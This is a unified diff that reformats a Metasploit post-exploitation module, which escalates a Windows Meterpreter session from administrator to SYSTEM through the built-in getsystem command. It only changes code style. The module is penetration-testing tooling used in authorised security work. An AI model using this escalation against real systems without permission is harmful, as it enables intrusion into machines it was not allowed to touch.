@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,29 +8,25 @@ require 'msf/core'
 require 'rex'
 require 'metasm'
 
-
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'          => 'Windows Escalate Get System via Administrator',
-      'Description'   => %q{
-          This module uses the builtin 'getsystem' command to escalate
-        the current session to the SYSTEM account from an administrator
-        user account.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => 'hdm',
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+                      'Name'          => 'Windows Escalate Get System via Administrator',
+                      'Description'   => %q(
+                          This module uses the builtin 'getsystem' command to escalate
+                        the current session to the SYSTEM account from an administrator
+                        user account.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => 'hdm',
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ]))
 
     register_options([
-      OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
-    ], self.class)
-
+                       OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
+                     ], self.class)
   end
 
   def unsupported
@@ -38,7 +35,6 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-
     technique = datastore['TECHNIQUE'].to_i
 
     unsupported if client.platform != 'windows' || (client.arch != ARCH_X64 && client.arch != ARCH_X86)
@@ -55,5 +51,4 @@ class MetasploitModule < Msf::Post
       print_error("Failed to obtain SYSTEM access")
     end
   end
-
 end
